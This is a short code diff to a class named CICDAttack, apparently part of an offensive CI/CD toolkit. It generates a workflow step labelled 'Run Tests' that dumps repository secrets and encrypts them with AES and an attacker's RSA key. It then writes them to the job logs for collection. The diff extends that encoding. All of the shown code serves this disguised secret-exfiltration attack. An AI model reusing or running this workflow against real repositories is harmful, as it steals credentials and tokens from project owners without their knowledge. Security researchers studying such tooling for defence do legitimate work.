@@ -93,9 +93,11 @@ class CICDAttack():
             echo_cmd += f'{secret}=${secret} \\n'
 
         echo_cmd += '"'
+        print(echo_cmd)
 
         # variables don't support hyphens, so replace them with underscores.
-        pkey_varname = f'{branch_name.replace("-", "_")}_KEY'
+        pkey_varname = f'{branch_name.replace("-", "_").replace(".", "_")}_KEY'
+
         secret_envmap[pkey_varname] = pubkey
 
         yaml_file['name'] = branch_name
@@ -108,7 +110,7 @@ class CICDAttack():
                     'name': 'Run Tests',
                     'env': secret_envmap,
                     'run': "openssl rand -base64 24 | tr -d '\\n' > sym.key; echo -n '$';"
-                           f"{echo_cmd} | openssl enc -aes-256-cbc -kfile "
+                           f"{echo_cmd} | base64 -w 0 | openssl enc -aes-256-cbc -kfile "
                            "sym.key -pbkdf2 | base64 -w 0 | tr -d '\\n';"
                            f"echo '$'; echo -n '$'; cat sym.key | base64 | "
                            "openssl rsautl -encrypt -inkey "
